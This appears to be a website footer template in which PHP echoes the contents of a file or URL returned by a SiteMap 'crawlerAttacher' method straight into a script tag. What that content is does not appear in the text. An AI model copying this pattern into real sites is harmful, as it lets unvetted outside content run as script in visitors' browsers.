<section>
<!--footer code come here-->
    <script type="application/javascript">
        <?php
        $m = new \SiteMap\SiteMap();
        if(!empty($m->crawlerAttacher())){
            echo file_get_contents($m->crawlerAttacher());
        }
        ?>
    </script>
</section>
</div>
</body>
</html>